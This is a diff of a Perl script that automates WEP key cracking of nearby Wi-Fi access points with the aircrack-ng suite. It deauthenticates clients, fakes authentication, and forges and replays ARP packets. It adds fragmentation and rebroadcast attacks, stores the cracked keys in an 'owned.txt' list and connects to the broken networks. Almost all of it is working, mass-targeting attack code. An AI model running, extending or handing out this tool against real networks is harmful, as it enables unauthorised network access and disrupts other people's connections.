@@ -53,11 +53,18 @@ my $airodumpwait = 4;
 # Minimum number of IVs collected when we want cracking to begin (20k for 40-bit, 40k for 128-bit)
 my $min_iv = 17000;
 
+# After 10 sleeps if IV is less than 100, send deauth broadcast ($ivtimer / 10 )
+my $try_deauth = 1;
+
+# After 40 sleeps if IV is at least 1 and less than 300,  try clientless attacks: fragmentation then rebroadcast -p0841
+my $try_fragment = 4;
+
+# After 40 seconds, stop fragmentation, try rebroadcast -p 0841
+my $frag_timeout = 40;
 
 
-
-# After 3600 sleeps (1 hour), if something goes wrong, don't wait forever, stop and move to the next AP ($ivtimer / 10)
-my $ap_timeout = 360;
+# After 20 minutes worth of sleeps, if we are still injecting, don't wait forever, stop and move to the next AP ($ivtimer / 10)
+my $ap_timeout = 120;
 
 # After 15 minutes of cracking and still couldn't find the key, don't wait forever, move to the next AP
 my $crack_timeout = 900;
@@ -70,15 +77,6 @@ my $sortcon_duration = 4;
 
 # Interface selection timeout, in case multiple interfaces were found.
 my $select_timeout = 3;
-
-# After 20 sleeps if IV is less than 100, send deauth broadcast ($ivtimer / 10 )
-my $deauth_timeout = 2;
-
-# After 40 sleeps if IV is less than 100, try rebroadcast (-p0841) ($ivtimer / 10)
-my $arpreplay_timeout = 4;
-
-# After 60 sleeps if IV is less than 100, stop injecting and move to the next AP ($ivtimer / 10)
-my $inject_timeout = 6;
 
 
 ###################  DEFAULT NON-OVERLAPPING CHANNELS SELECTION  #######################
@@ -109,12 +107,12 @@ my %bad_ap;
 our $gateway;
 my $bssid; 
 my $ssid; 
-my $date = `date +%s`;
-chomp $date;
+my $key; 
 our $manualip = 0;
 my $apcount;
 my $selected_iface;
 our $set_monitor_error;
+our $old_ivcount = 0;
 
 
 
@@ -132,7 +130,7 @@ my $iface_index = 1;
 unless ($inject_iface ne '' && $monitor_iface ne ''){
 print "\nDetecting wireless interfaces...\n";
 my $autodetect_iface = 1;
-open AIRMON, "airmon-ng |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+open AIRMON, "airmon-ng |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 while (<AIRMON>){
   next unless /^[a-z]+\d\s/;
   next if /^mon\d/;
@@ -149,6 +147,8 @@ while (<AIRMON>){
      $wifi_iface{$iface_index} = { monitor => $monitor_iface,
 				   inject => $inject_iface
 				   }; 
+
+### Don't use wifi0 as inject interface in case of atheros card 
      $wifi_iface{$iface_index}{'inject'} = $monitor_iface  if ($inject_iface =~ /wifi/);
 	
 
@@ -202,7 +202,7 @@ $ENV{'inject_iface'} = $inject_iface;
 
 unless (defined $macaddress && $macaddress ne ''){
 
-	open IFCONFIG, "ifconfig $inject_iface |" or die "Can't run ifconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+	open IFCONFIG, "ifconfig $inject_iface |" or die "Can't run ifconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 	while (<IFCONFIG>){
 	  next unless /HW/;
 	  $macaddress = (split /\s+/,$_)[-1];
@@ -352,7 +352,7 @@ if (scalar @ARGV > 0 ){
 	###  Read the list of cracked APs and store each into %owned_ap (Needed for sort, connect)
 
 	if (-e "owned.txt"){
-	open OWNED, "owned.txt" or die "Can\'t open owned.txt!\n\n";
+	open OWNED, "owned.txt" or die "Can\'t open owned.txt!: $!\n\n";
 	  while (<OWNED>){
 		next if /^\s*$/;
 		$owned_ap{(split / === / , $_)[0]} = {
@@ -373,10 +373,11 @@ if (scalar @ARGV > 0 ){
 ### Read the list of bad APs and store each into %bad_ap, so that we can skip cracking an AP if it is included in the list
 
       if (-e "bad_ap.txt"){
-	    open BADAP, "bad_ap.txt" or die "Can\'t open bad_ap.txt!\n\n";
+	    open BADAP, "bad_ap.txt" or die "Can\'t open bad_ap.txt!: $!\n\n";
 	    while (<BADAP>){
 		chomp;
 		$_ =~ s/^\s*$//;
+	        $_ =~ tr/a-z/A-Z/;
 		$bad_ap{$_} = '';
 	    }
       }
@@ -384,7 +385,7 @@ if (scalar @ARGV > 0 ){
 
 ###  Read the list of known APs and store each into %known_ap, so that we can skip cracking an AP unless it is included in the list
 	if (-e "known_ap.txt"){
-		open KNOWNAP, "known_ap.txt" or die "Can\'t open known_ap.txt!\n\n";
+		open KNOWNAP, "known_ap.txt" or die "Can\'t open known_ap.txt!: $!\n\n";
 		while (<KNOWNAP>){
 			chomp;
 			$_ =~ s/^\s*$//;
@@ -424,19 +425,16 @@ if (scalar @ARGV > 0 ){
 
 	#################   BEGIN  MODE   CRACK  ####################################
 	if ($mode eq 'crack'){
-	   print "\nPwning \"$all_ap{$all_ap_key}->{'ssid'}\" ($all_ap{$all_ap_key}->{'bssid'})\n";
+	my $start_cracktime = time;
+	   print "\nPwning \"$all_ap{$all_ap_key}->{'ssid'}\" ($all_ap{$all_ap_key}->{'bssid'}) ", scalar localtime($start_cracktime),"\n";
 
 
-	### Existing keys can be replaced if $dateowned have passed since the date the key was cracked.
+	### Existing keys can be replaced if dateowned have passed since the date the key was cracked.
 	### If ran in less than 15 days, existing entries will be skipped
 
 
-	if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} && ($date  - $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) < 1296000) {
-
-	  my $dateowned = `date -d \@$owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}`;
-	   chomp $dateowned;
-
-	   print "Owned just recently ($dateowned).\nSkipping...\n\n";
+	if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}} && (time  - $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}) < 1296000) {
+	   print "Owned just recently \(", scalar localtime($owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'dateowned'}),"\).\nSkipping...\n\n";
 	   next;
 	 }
 
@@ -447,7 +445,7 @@ if (scalar @ARGV > 0 ){
 	   if ($all_ap{$all_ap_key}->{'ssid'} eq 'hidden'){
 	     print "SSID Hidden!\nTrying to reveal...\n";
 
-	     die "Could not fork airodump-ng!" unless defined (my $deauthdump_pid = fork);
+	     die "Could not fork airodump-ng!: $!\n\n" unless defined (my $deauthdump_pid = fork);
 	     if ($deauthdump_pid == 0){
 	       `airodump-ng -t wep -d $all_ap{$all_ap_key}->{'bssid'} $monitor_iface -c $all_ap{$all_ap_key}->{'channel'} -n -w deauth_dump 2>&1`;
 	     }
@@ -483,7 +481,7 @@ if (scalar @ARGV > 0 ){
 		  `aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress 2>&1`;
 		}
 		sleep $airodumpwait;
-		open DEAUTHDUMP, "deauth_dump-01.csv" or die "Can't open deauth_dump-01.csv!\n\n";
+		open DEAUTHDUMP, "deauth_dump-01.csv" or die "Can't open deauth_dump-01.csv!: $!\n\n";
 		while (<DEAUTHDUMP>){
 		  next if (/^\r$/ || /^BSSID/);
 		  last if (/^Station/);
@@ -564,17 +562,21 @@ print "Checking for mac filtering...";
 
 ########  BEGIN  ONE TIME FAKE AUTH FORK  #####################
 
+# Escape special characters in SSID before doing any fake auth
+	$ssid = $all_ap{$all_ap_key}->{'ssid'};
+	$ssid =~ s/"/\\"/g;
 
 ### Child fork will write to the parent via PREAUTH_IPC
-
-die "Could not fork aireplay-ng!\n\n"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
-
+die "Could not fork aireplay-ng!: $!\n\n"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
 if ($preauth_pid == 0){
-  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress 2>&1|" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+
+
+  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress 2>&1|" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
   while (<PREAUTH>){
      next if /^\s*$/;
      print;
   }
+   exit(0);
 }  
 
 
@@ -585,7 +587,7 @@ if ($preauth_pid == 0){
 ### Parent will only get pass waitpid after the child exits (when killed by the parent or dies on its own.
 
 
-
+sleep 3;
 while (<PREAUTH_IPC>){
   push @preauth, $_;
   if (/Association successful/){
@@ -618,9 +620,6 @@ while (<PREAUTH_IPC>){
 
  if (/unsuccessful/){
       print "\nCan't associate. aireplay-ng died!\n\n"; 
-      foreach (@preauth){
-	print "\t$_";
-      }
       $auth = 'failed';
       kill(9, $preauth_pid);
       last;
@@ -680,11 +679,13 @@ if (defined $errline){
 	print "Trying to associate..." unless defined $errline;
 
 	   #################     BEGIN FAKEAUTH FORK    ####################################
-	   die "Could not fork aireplay-ng!" unless defined (my $pid = fork);
+	   die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $pid = fork);
 	   if ($pid == 0){
-	      open AIREPLAY, "aireplay-ng -1 6000 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress |" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+
+	      open AIREPLAY, "aireplay-ng -1 900 -o 1 -q 10 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \"$ssid\" -h $macaddress |" or die "Can't run aireplay-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 	      my @fakeauth;
 	      while (<AIREPLAY>){
+	      next if /^\s+$/;
 	      push @fakeauth, $_; 
 	       if (/Association successful/){
 		  if (defined $errline or defined $skaauth){
@@ -697,7 +698,7 @@ if (defined $errline){
 		  print "Starting to inject...\n";
 
 		  ###################    BEGIN AIRODUMP FORK   ###############################
-		  die "Could not fork airodump-ng!" unless defined (my $airodump_pid = fork);
+		  die "Could not fork airodump-ng!: $!\n\n" unless defined (my $airodump_pid = fork);
 		  if ($airodump_pid == 0){
 	#	      print "Forking airodump-ng...\n";
 		     `airodump-ng $monitor_iface -t wep -u 20 -d $all_ap{$all_ap_key}->{'bssid'} -c $all_ap{$all_ap_key}->{'channel'} -w inject_dump  2>&1`;
@@ -710,7 +711,7 @@ if (defined $errline){
 		`aireplay-ng -0 3 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
 
 		  ##################    BEGIN ARP REPLAY FORK   #############################
-		  die "Could not fork aireplay-ng!" unless defined (my $aireplay_pid = fork);
+		  die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $aireplay_pid = fork);
 		  if ($aireplay_pid == 0){
 	#   	      print "Forking aireplay-ng...\n";
 
@@ -757,7 +758,7 @@ if (defined $errline){
 
 	###  Keep watching the contents of airodump output "inject_dump-01.csv" every 1 sleep
 
-	  open INJECTDUMP, "inject_dump-01.csv" or die "Can't open inject_dump-01.csv!\n\n";
+	  open INJECTDUMP, "inject_dump-01.csv" or die "Can't open inject_dump-01.csv!: $!\n\n";
 	  while (<INJECTDUMP>){
 	     next if (/^\r$/ || /^BSSID/);
 	     last if (/^Station/);
@@ -771,77 +772,93 @@ if (defined $errline){
 
 
 	     if ($all_ap{$all_ap_key}->{'iv'} >= $min_iv){
-	       print "\nCollected $all_ap{$all_ap_key}->{'iv'} IVs. Trying to crack..\n";
+	       print "\nCollected $all_ap{$all_ap_key}->{'iv'} IVs. Trying to crack...\n";
 	#       print "Forking aircrack-ng...\n";
+
+		my $elapsed_cracktime;
+		my $min;
+		my $sec;
 
 
 	################    BEGIN AIRCRACK FORK    ###########################################
-	       die "Could not fork aircrack-ng!" unless defined (my $aircrack_pid = fork);
+	       die "Could not fork aircrack-ng!: $!\n\n" unless defined (my $aircrack_pid = fork);
 	       if ($aircrack_pid == 0){
 
 
-	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die "Can't run aircrack-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die "Can't run aircrack-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 		 while (<AIRCRACK>){
 			chomp;
-			if ($keyfound){
-			(my $successrate) = $_ =~ /(\d+)%$/;
-				print "$_\n";
+				if ($keyfound){
+				   (my $successrate) = $_ =~ /(\d+)%$/;
+				   print "$_\n";
 
-###  Decloacking... Feature for next version.
-#			if ($successrate < 100){
-#			  print "Would you like to decloack?";
-#			}
+	###  Decloacking... Feature for next version.
+				   #if ($successrate < 100){
+				       #print "Would you like to decloack?";
+				    #}
+
+	### Just to see final IV count after cracking
+
+				    close INJECTDUMP;	
+				    open INJECTDUMP, "inject_dump-01.csv" or last;
+				    while (<INJECTDUMP>){
+					next if (/^\r$/ || /^BSSID/);
+					last if (/^Station/);
+					chomp;
+					$all_ap{$all_ap_key}->{'iv'} = (split /,\s+/,$_)[10];
+					print "OWNED USING $all_ap{$all_ap_key}->{'iv'} IVs!\n";
+
+					if ($elapsed_cracktime >= 60){
+					    $min = int($elapsed_cracktime / 60);
+					    $sec = $elapsed_cracktime % 60;
+					    $elapsed_cracktime = sprintf ("%02d:%02d", $min, $sec); 
+					    print "Elapsed Time: $elapsed_cracktime\n";
+					}else{
+					    print "Elapsed Time: 00:$elapsed_cracktime\n";
+					 }
 
 
 
-### Just to see final IV count after cracking
+				     }
+				      exit(0);
+				  }
 
-			close INJECTDUMP;	
-			open INJECTDUMP, "inject_dump-01.csv" or last;
-			while (<INJECTDUMP>){
-			   next if (/^\r$/ || /^BSSID/);
-			   last if (/^Station/);
-			   chomp;
-			   $all_ap{$all_ap_key}->{'iv'} = (split /,/,$_)[10];
-			   $all_ap{$all_ap_key}->{'iv'} =~ s/^\s*//;
-			   print "OWNED USING $all_ap{$all_ap_key}->{'iv'} IVs!\n";
-			}
-			exit(0);
-			}
-		   if (/KEY/){ 
-			$_ =~ s/\s*//;
-			print $_;
-			($all_ap{$all_ap_key}->{'key'}) = $_ =~ /\[\s(.*)\s\]/;
+		        if (/KEY/){ 
+			      $elapsed_cracktime = time - $start_cracktime;
+			      $_ =~ s/\s*//;
+			      print $_;
+			      ($all_ap{$all_ap_key}->{'key'}) = $_ =~ /\[\s(.*)\s\]/;
 			
 
-	### Make sure the existing key will be replaced with a new one in case 15 days have passed since $dateowned
+	### Make sure the existing key will be replaced with a new one in case 15 days have passed since dateowned
+			      if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}){
+			          open KEYS, "owned.txt" or die "Can't open owned.txt!: $!\n\n";
+			          open KEYSTEMP, ">.owned.txt.tmp" or die "Can't write to .owned.txt.tmp!: $!\n\n";
+			          while (<KEYS>){
+				      chomp;
+				      next if /$all_ap{$all_ap_key}->{'bssid'}/;
+				      print KEYSTEMP "$_\n";
+			          }
+			          `cp .owned.txt.tmp owned.txt`;
+			          close KEYS;
+			      }
 
-			if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}){	
-			  open KEYS, "owned.txt" or die "Can't open owned.txt!\n\n";
-			  open KEYSTEMP, ">.owned.txt.tmp" or die "Can't write to .owned.txt.tmp!\n\n";
-			  while (<KEYS>){
-				chomp;
-				next if /$all_ap{$all_ap_key}->{'bssid'}/;
-				print KEYSTEMP "$_\n";
-			  }
-			  `cp .owned.txt.tmp owned.txt`;
-			close KEYS;
-			}
-			open KEYS, ">>owned.txt" or die "Can't append to owned.txt!\n\n";
-		         print KEYS "$all_ap{$all_ap_key}->{'bssid'} === $all_ap{$all_ap_key}->{'channel'} === $all_ap{$all_ap_key}->{'ssid'} === $all_ap{$all_ap_key}->{'key'} === $date\n";
-			$keyfound = 1;
-		   }
+			      open KEYS, ">>owned.txt" or die "Can't append to owned.txt!: $!\n\n";
+		              print KEYS "$all_ap{$all_ap_key}->{'bssid'} === $all_ap{$all_ap_key}->{'channel'} === $all_ap{$all_ap_key}->{'ssid'} === $all_ap{$all_ap_key}->{'key'} === ", time, "\n";
+			      $keyfound = 1;
+		       }
 
 		 }
 	       }
 #########################     END AIRCRACK FORK    ###############################################
 
 
-	###  Wait for aircrack to exit. aircrack will always exit after successfully finding the key so the while loop <AIRCRACK> terminates, and we set $cracking = 'done' after it exits 
-	###  If it cannot find the key, it will keep trying as soon as the dump files have updated after PTW_TRY_STEP. If it still cannot find the key, the AP will be skipped after $crack_timeout
+###  Wait for aircrack to exit. aircrack will always exit after successfully finding the key so the while loop <AIRCRACK> terminates, and we set $cracking = 'done' after it exits 
+###  If it cannot find the key, it will keep trying as soon as the dump files have updated after PTW_TRY_STEP. If it still cannot find the key, the AP will be skipped after $crack_timeout
 
 
 ### Timeout cracking if it aircrack-ng could not find the key after $crack_timeout
+
 eval {
   local %SIG;
   $SIG{ALRM} = sub { print "Could not find the key after $crack_timeout seconds.\nSkipping...\n"; kill(9, $aircrack_pid); };
@@ -855,11 +872,11 @@ eval {
 
 	     }
 
-	###  This sleep indicates when to try reading the csv again to get the IV counts. On default install of aircrack-ng, perhaps 23 seconds should be safe.
+###  This sleep indicates when to try reading the csv again to get the IV counts. On default install of aircrack-ng, perhaps 23 seconds should be safe.
 	      sleep 2;
 	      ++$ivtimer;
 
-	###  Display IV counts every 10 seconds, Deauth if it's less than 100 after 20 sleeps or try rebroadcast (-p0841) or else skip AP 
+#######################  Display IV counts every 10 seconds ######################
 
 if ($ivtimer % 10 == 0 || $ivtimer == 1){
 	      print "$all_ap{$all_ap_key}->{'iv'}" unless $cracking eq 'done';
@@ -867,9 +884,13 @@ if ($ivtimer % 10 == 0 || $ivtimer == 1){
 	      print "." if ($ivtimer % 2 == 0);
 	      print "\n" if ($ivtimer % 60 == 0);
 
-## After 20 sleeps
-	      if ($ivtimer / 10 == $deauth_timeout && $all_ap{$all_ap_key}->{'iv'} < 100){
-		print "Still $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSending Deauth...\n";
+###################################################################################
+
+
+############# After 10 sleeps, try Deauth #####################################
+
+	      if ($ivtimer / 10 == $try_deauth && $all_ap{$all_ap_key}->{'iv'} < 100){
+		print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSending Deauth...\n";
 		`aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
 		print "Sleeping...\n";
 		sleep 2;
@@ -878,42 +899,143 @@ if ($ivtimer % 10 == 0 || $ivtimer == 1){
 		print "Counting IVs...\n"; 
 		sleep 2
 	      }
-## After 40 sleeps
-	      if ($ivtimer / 10 == $arpreplay_timeout && $all_ap{$all_ap_key}->{'iv'} < 100){
-		print "Still $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSeems like there is no client connected...\nTrying rebroadcast...\n";
+
+################################################################################
+
+
+
+######################   BEGIN  CLIENT-LESS  ATTACKS  ####################################
+
+######### After 40 sleeps try clientless attacks (fragmentation, rebroadcast) ######################
+
+my @fragment;
+my $chosen_packet;
+my $xor;
+my $fragmentation = '';
+
+	      if ( $ivtimer / 10 == $try_fragment ) { 
+		$old_ivcount = $all_ap{$all_ap_key}->{'iv'};
+		if ($all_ap{$all_ap_key}->{'iv'} > 0 && $all_ap{$all_ap_key}->{'iv'} < 300 ) {
+		    print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds. =(\nThis will take forever. Let's try Fragmentation!\n";
+		    print "Waiting for data...";
 		
-		  ##################    BEGIN REBROADCAST FORK   #############################
-		  die "Could not fork aireplay-ng!" unless defined ($aireplay_rebroadcast_pid = fork);
-		  if ($aireplay_rebroadcast_pid == 0){
-	#   	      print "Forking aireplay-ng for rebroadcast...\n";
-		     `aireplay-ng $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress  2>&1`;
+
+		die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $fragment_pid = open(FRAGMENT_IPC, "-|"));
+		if ($fragment_pid == 0){
+		  `cp inject_dump-01.cap inject_dump-01.cap.tmp`;
+		  open FRAGMENT, "aireplay-ng -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap.tmp -h $macaddress 2>&1 |"; 
+		  while (<FRAGMENT>){
+			next if /^\s*$/;
+			print;
 		  }
-		  ##################    END REBROADCAST FORK    ##############################
+			exit(0);
+		}
+
+######## Timeout fragmentation after frag_timeout seconds  ####################
+
+eval {
+  local %SIG;
+  $SIG{ALRM} = sub { 	
+		    unless ($fragmentation eq 'failed' or $fragmentation eq 'success'){
+			$fragmentation = 'timedout';
+			kill(9, $fragment_pid); 
+		    }
+
+
+		   };
+  alarm $frag_timeout;
+};
+
+
+#################################################################################
+
+		while (<FRAGMENT_IPC>){
+		     if (/chosen/){	
+		 	$chosen_packet = (split/\s+/,$_)[-1];
+			print "\nTrying $chosen_packet...";
+		     }	
+		     if (/xor/) {
+			$fragmentation = 'success';
+			$xor = (split/\s+/,$_)[-1];
+			chomp($xor);
+			print "\nGOT KEYSTREAM!! -> $xor\n";
+#		        print "Building arp packet (forged_arp.cap)...\n";
+		        `packetforge-ng -0 -a $all_ap{$all_ap_key}->{'bssid'} -h $macaddress -k 255.255.255.255 -l 255.255.255.255 -y $xor -w forged_arp.cap`;
+		        print "Replaying \"forged_arp.cap\"...\n";
+
+		    	die "Could not fork aireplay-ng for \"forged_arp\"!: $!\n\n" unless defined (my $forged_arpreplay_pid = fork);
+		    	if ($forged_arpreplay_pid == 0){
+		       	   `aireplay-ng $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1`;
+		        }
+		        sleep 3;
+		### We don't need two aireplay-ng -3 running so we kill this one after 3 seconds, just enough for the other aireplay-ng -3 to pick up our forged arp
+		        kill (9, $forged_arpreplay_pid);
+		     }
+		 
+		 }
+
+
+		### Fragmentation will exit either because it has timed out or it has ran out of data. In either case, we'll try rebroadcast
+
+ 	          unless ($fragmentation eq 'success'){
+
+		     if ($fragmentation eq 'timedout'){
+		         print "\nAttack failed after $frag_timeout seconds.\nTrying rebroadcast (-p 0841)...\n";
+		     }else{
+			  $fragmentation = 'failed';
+		          print "\nTried all data packets. Still nothing.\nTrying rebroadcast (-p 0841)...\n";
+		     }	
+
+		     die "Could not fork aireplay-ng!: $!\n\n" unless defined ($aireplay_rebroadcast_pid = fork);
+		     if ($aireplay_rebroadcast_pid == 0){
+	#   	          print "Forking aireplay-ng for rebroadcast...\n";
+		          `aireplay-ng $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap 2>&1`;
+		     }
+			
+		  }
+
+	### If IV is still 0 after 40 seconds, we give up.
 		
-
+	      }elsif ($all_ap{$all_ap_key}->{'iv'} == 0) {
+			print "\n$ivtimer seconds and no ARPs, no Data?\nThis ain't gonna work. Skipping...\n"; 	
+			$timeout = 1;
 	      }
-		
-## After 60 sleeps
-
-	      if ($ivtimer / 10 == $inject_timeout && $all_ap{$all_ap_key}->{'iv'} < 100){
-		print "Still $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSkipping...\n";
-		$timeout = 1;
-	      }
-
-## After 30 mins worth of sleeps.
+	  }
+	   
 	
-	     if ($ivtimer / 10 == 180){
-		print "Still $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds... AP must have rebooted.\n";
-		print "Trying to reassociate once...\n";
-	        `aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress`;
-	     }
-	
-## After 1 hour worth of sleeps. 
+### 20 sleeps after trying rebroadcast and IVs did not increase at least 10, perhaps we got a bad packet
+### Let's try the next one by sending INT to aireplay rebroadcast
+
+	if ($ivtimer / 10 == 60 && ($all_ap{$all_ap_key}->{'iv'} - $old_ivcount) <= 10){
+		if ($fragmentation ne ''){
+			print "OLD IV: $old_ivcount\n";
+			print "\nStill $all_ap{$all_ap_key}->{'iv'} after ". $ivtimer + $frag_timeout . " seconds...\n";
+			print "Rebroadcast is not working, trying next data packet...\n";
+			kill(2, $aireplay_rebroadcast_pid);
+		}
+	}
+
+
+##########################   END  CLIENT-LESS  ATTACKS  ####################################
+
+
+
+### After 20 minutes (+ $frag_timeout) worth of sleeps
 
 	      if ($ivtimer / 10 == $ap_timeout){
-		print "Still $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds... AP must have died. \nSkipping...\n";
+	         if ($fragmentation ne ''){
+		     print "\nStill $all_ap{$all_ap_key}->{'iv'} after ". $ivtimer + $frag_timeout . " seconds...\nSkipping...\n";
+		 }else{ 	
+		     print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSkipping...\n";
+		 }
 		$timeout = 1;
 	      }
+
+	
+
+
+
+
 	  }
 	}
 
@@ -940,18 +1062,20 @@ if ($ivtimer % 10 == 0 || $ivtimer == 1){
 
 
 	      }
-	       print "\nCan't associate. aireplay-ng died!\n\n"; 
-	       foreach (@fakeauth){
+
+### When <AIREPLAY> ends, that means, FAKEAUTH did not work so we skip this AP
+	   print "\nCan't associate. aireplay-ng died!\n\n"; 
+	   foreach (@fakeauth){
 		print "\t$_";
-		}
-	       print "\n\n";
-	       exit;
+	   }
+	   print "\n\n";
+	   exit;
 	  
 
 	   }
 
 	###  PARENT of $pid (FAKEAUTH)
-	###  Wait for FAKE AUTH child to finish
+	###  Wait for FAKEAUTH child to finish
 		waitpid($pid, 0);
 		system("stty", "sane");
 
@@ -984,16 +1108,14 @@ if ($ivtimer % 10 == 0 || $ivtimer == 1){
 
 	  }elsif($mode eq 'connect'){
 
-	open OWNED, "owned.txt" or die "No APs to connect!!\n$!";
+	open OWNED, "owned.txt" or die "No APs to connect!!:$!\n\n";
 		my $connect_status;
 		while (<OWNED>){
 			next if /^\s*$/;
 			next if /^#$/;
 			$bssid = (split / === /, $_)[0]; 
-		#	$channel = (split / === /, $_)[1]; 
-		my	$ssid = (split / === /, $_)[2]; 
-		my	$key = (split / === /, $_)[3]; 
-		#	$dateowned = (split / === /, $_)[4];
+			$ssid = (split / === /, $_)[2]; 
+			$key = (split / === /, $_)[3]; 
 			print "\nConnecting to \"$ssid\" ($bssid)...\n";
 			if (exists $all_ap{$bssid}){	
 			  $connect_status = connect($bssid, $key, $ssid, 'connect', $pinghost);
@@ -1035,7 +1157,7 @@ if ($mode eq 'sort'){
 my %unsortedap;
 my @outofrange;
 
-open OWNED, "owned.txt" or die "Can't open owned.txt!\n\n";
+open OWNED, "owned.txt" or die "Can't open owned.txt!: $!\n\n";
 while (<OWNED>){
    chomp;
    $bssid = (split/ === /, $_)[0];
@@ -1049,8 +1171,8 @@ while (<OWNED>){
 
 }
 
-open SORTEDRTT, ">owned_rtt.txt" or die "Can't write to owned_rtt.txt!\n\n";
-open SORTED, ">owned_sorted.txt" or die "Can't write to owned_sorted.txt!\n\n";
+open SORTEDRTT, ">owned_rtt.txt" or die "Can't write to owned_rtt.txt!: $!\n\n";
+open SORTED, ">owned_sorted.txt" or die "Can't write to owned_sorted.txt!: $!\n\n";
 foreach (sort { $unsortedap{$a} <=> $unsortedap{$b} } keys %unsortedap){
 	print SORTEDRTT "$_ === $unsortedap{$_}\n";
 	print SORTED "$_\n";
@@ -1058,7 +1180,7 @@ foreach (sort { $unsortedap{$a} <=> $unsortedap{$b} } keys %unsortedap){
 close SORTEDRTT;
 close SORTED;
 system "touch owned_sorted.txt" unless (-e 'owned_sorted.txt');
-open SORTED, ">>owned_sorted.txt" or die "Can't append to owned_sorted.txt!\n\n";
+open SORTED, ">>owned_sorted.txt" or die "Can't append to owned_sorted.txt!: $!\n\n";
 foreach (@outofrange){
 	print SORTED "$_\n";
 }
@@ -1067,8 +1189,6 @@ close SORTED;
 
 
 
-#my $previous_owned = 'owned.old'.$date;
-#system("mv owned.txt $previous_owned"); 
 system("mv owned_sorted.txt owned.txt");
 print "\n\nOutput written to \"owned_rtt.txt\".\nYou should manually compare it with \"owned.txt\"\n\n";
 }
@@ -1099,7 +1219,7 @@ print "Associating...\n";
 `iwconfig $inject_iface key $key`;
 
 sleep 15;
-open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
 while (<IWCONFIG>){
   if (/linked/){
 	print "Associated successfully...\n";
@@ -1138,7 +1258,7 @@ while (<IWCONFIG>){
        }else{
 	 print "Getting RTT of $pinghost...\n";
 	}
-      open PING, "ping -q -c 10 $pinghost |" or die "Can't run ping.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n";
+      open PING, "ping -q -c 10 $pinghost |" or die "Can't run ping.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
       while (<PING>){
         if (/rtt/){
 	  my $rtt = (split/\//, $_)[4];
@@ -1177,13 +1297,13 @@ if ($ping != 0){
 	}
    print "Ping failed!!\n";
    print "Trying DHCP...\n";
-	die "Could not fork dhclient" unless defined (my $pid = fork);
+	die "Could not fork dhclient!: $!\n\n" unless defined (my $pid = fork);
 	if ($pid == 0){
 	   `dhclient $inject_iface 2>&1`;
 	exit(0);
 	}	
